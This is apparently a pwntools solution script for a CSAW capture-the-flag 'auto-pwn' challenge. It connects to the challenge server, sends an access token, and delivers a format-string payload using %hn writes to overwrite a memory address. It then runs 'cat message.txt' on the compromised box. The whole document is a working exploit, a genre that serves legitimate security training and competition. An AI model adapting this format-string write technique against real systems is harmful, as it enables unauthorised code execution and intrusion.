from pwn import *

io = remote('auto-pwn.chal.csaw.io', 11004)
#io = process('./real')

print(io.recv())
io.sendline(b'bc53f7d2068355128e0bd28e40513d53')
print(io.recvuntil(b'Here is the binary that is currently running on this box: \n-------------------------------------------------------------------\n'))


#fp = open('bin', 'wb')
#fp.write(io.recvuntil(b'\n-------------------------------------------------------------------'))
#fp.close()

print(io.recvuntil(b'\n-------------------------------------------------------------------'))
print(io.recv())

payload = b'AA'+p32(0x0804e028+2)+p32(0x0804e028)+b'%2042x'+b'%6$hn'+b'%35769x'+b'%7$hn'
io.sendline(payload)
io.sendline('cat message.txt')
print(io.recvuntil(b'Sorry'))
